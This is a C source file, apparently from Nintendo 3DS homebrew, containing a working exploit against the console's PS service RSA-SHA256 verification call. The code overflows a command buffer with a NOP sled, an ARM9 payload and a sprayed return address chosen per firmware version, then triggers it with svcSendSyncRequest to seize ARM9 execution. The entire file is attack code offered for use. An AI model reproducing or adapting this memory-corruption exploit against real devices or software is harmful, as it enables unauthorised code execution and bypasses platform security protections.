#include "arm9.h"
#include "utils.h"
#include "svc.h"
#include "pointers.h"

u32 *work_buffer = BUFFER_ADR;

Result PS_VerifyRsaSha256(Handle *handle)
{
    Result ret = 0;
    u32 *cmdbuf = getThreadCommandBuffer();
    u8 *cmdbuf8 = (u8*)cmdbuf;

    const u32 bufSize = PS_VERIFYRSASHA256_BUFFER_SIZE;

    u32* buffer = work_buffer;
    memset(buffer, 0, bufSize);

    buffer[0x28/sizeof(u32)] = 0x820002;
    buffer[0x2C/sizeof(u32)] = (u32)(buffer + 0x80/sizeof(u32));
    buffer[0x30/sizeof(u32)] = (bufSize << 4) | 0xA;
    buffer[0x34/sizeof(u32)] = (u32)(buffer + 0x380/sizeof(u32));
    buffer[0x280/sizeof(u32)] = bufSize<<3; //RSA bit-size, for the signature.

    u32 *ptr = buffer+0x380/sizeof(u32);
    u32 size;
    const u32 *src = (const u32 *)getArm9Payload(&size);
    u32 nopsled = 0x1000; // FIXME do we need such a  large NOP sled?

    for(u32 i = 0; i < nopsled/sizeof(u32); i++)
        *ptr++ = 0xE1A00000;

    for(u32 i = 0; i < size; i+=4)
    {
        *ptr++ = *src++;
    }

    for(u32 i=0; i < bufSize-size-nopsled; i+=4)
    {
        //*ptr++ = 0x080C3EE0; //4.5
        //*ptr++ = 0x080C4420; //3.x
        //*ptr++ = 0x080C2520; //2.2
        *ptr++ = ARM9_EXPLOIT_PAYLOAD_BASE_ADDRESS; //2.1
        //*ptr++ = 0x080B9620; //1.1
        //*ptr++ = 0x080B95C0; //1.0
    }

    for(u32 i = 0; i < 0x80u; i++)
        cmdbuf8[i] = ((u8*)(buffer))[i];

    cmdbuf[0] = 0x00020244;

    if((ret = svcSendSyncRequest(*handle))!=0) return ret;

    //We do not expect to return from the syncRequest
    return (Result)cmdbuf[1];
}
